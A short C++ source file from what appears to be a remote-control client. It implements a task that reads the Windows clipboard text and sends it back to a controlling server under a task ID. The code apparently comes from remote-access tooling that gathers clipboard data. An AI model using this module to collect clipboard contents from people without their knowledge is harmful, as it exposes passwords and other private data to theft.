//
// Created by mukeran on 2020/9/12.
//
#include "pch.h"
#include "../connection/client.h"
#include "get_clipboard.h"
#include "handlers/clipboard.h"

get_clipboard::get_clipboard(string _taskId) {
    taskId = std::move(_taskId);
}

void get_clipboard::execute() {
    wstring ws(GetClipboardTextHelper());
    client::instance->sendPacket(response{ finished, taskId, string(ws.begin(), ws.end()) }.dump());
}
